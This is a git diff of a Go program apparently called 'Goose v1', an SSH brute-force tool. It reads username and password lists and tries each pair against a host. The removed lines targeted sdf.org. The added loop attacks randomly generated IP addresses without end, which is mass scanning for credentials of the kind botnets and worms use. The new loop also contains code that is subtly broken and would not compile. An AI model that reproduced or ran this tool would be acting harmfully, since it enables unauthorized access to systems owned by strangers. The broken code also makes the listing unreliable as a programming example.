@@ -1,7 +1,7 @@
 package main
 
 import (
-	"strconv"
+	//"strconv"
 	"time"
 	"fmt"
 	"math/rand"
@@ -10,6 +10,7 @@ import (
 	//"bytes"
 	"net"
 	"golang.org/x/crypto/ssh"
+	//"github.com/inancgumus/screen"
 	//"github.com/sfreiberg/simplessh"
 )
 
@@ -27,7 +28,8 @@ func readFile(f string) (data []string, err error) {
     if err != nil {
         return
     }
-    defer b.Close()    scanner := bufio.NewScanner(b)
+    defer b.Close()
+    scanner := bufio.NewScanner(b)
     for scanner.Scan() {
         data = append(data, scanner.Text())
     }
@@ -40,7 +42,7 @@ func randRange(min, max int) int {
 
 //this functions attempts to open an SSH connection with the target IP, using a username and password
 func sshConnect(ip, username, password string) bool {
-	fmt.Println("Scanning " + ip + "...")
+	fmt.Println("Attempting to connect to " + ip + " with " + username + ":" + password + "...")
 	sshConfig := &ssh.ClientConfig{
 		User:            username,
 		Auth:            []ssh.AuthMethod{ssh.Password(password)},
@@ -50,8 +52,12 @@ func sshConnect(ip, username, password string) bool {
 	time.Sleep(100 * time.Millisecond)
 	if err == nil {
 		conn.Close()
+		fmt.Println("Success!")
+		time.Sleep(100 * time.Millisecond)
 		return true
 	}
+	fmt.Println("Failed!")
+	time.Sleep(100 * time.Millisecond)
 	return false
 }
 
@@ -70,23 +76,25 @@ func sshScan(ip string) bool {
 //this function attempts to connect to the target IP with all possible combinations of usernames and passwords, provided by two list files
 func sshBrute(ip, usernameList, passwordList string) *cred {
 	fmt.Println("Brute-forcing " + ip + "...")
-	usernameList, err := readFile(usernameList)
+	userlist, err := readFile(usernameList)
 	if err != nil {
 		fmt.Println(err)
-		return false
+		return nil
 	}
-	passwordList, err := readFile(passwordList)
+	passlist, err := readFile(passwordList)
 	if err != nil {
 		fmt.Println(err)
-		return false
+		return nil
 	}
-	for _, username := range usernameList {
-		for _, password := range passwordList {
+	for _, username := range userlist {
+		for _, password := range passlist {
 			if sshConnect(ip, username, password) {
 				return &cred{url: ip, port: 22, username: username, password: password}
 			}
 		}
 	}
+	fmt.Println("Failed!")
+	time.Sleep(100 * time.Millisecond)
 	return nil
 }
 
@@ -105,13 +113,17 @@ func main() {
 	ascii := "✩░▒▓▆▅▃▂▁𝐆𝐨𝐨𝐬𝐞 𝐯𝟏▁▂▃▅▆▓▒░✩"
 	fmt.Println(ascii)
 	
-	/*
-	fmt.Println("Starting Probing...")
-	go fmt.Println("Google: " + strconv.FormatBool(sshScan("google.com")))
-	fmt.Println("SDF: " + strconv.FormatBool(sshScan("sdf.org")))
-	*/
-
-	fmt.Println("Starting Brute-Force...")
-	cred := sshBrute("sdf.org", "user.txt", "pass.txt")
-	fmt.Println(cred)
+	max_threads := 10
+	current_threads := 0
+	channels := make([]chan *cred, max_threads)
+	for {
+		for {
+			if !current_threads < max_threads {
+				break
+			}
+			current_threads += 1
+			channels[current_threads-1] := sshBrute(genAddress(), "user.txt", "pass.txt")
+			fmt.Println(cred)
+		}	
+	}
 }
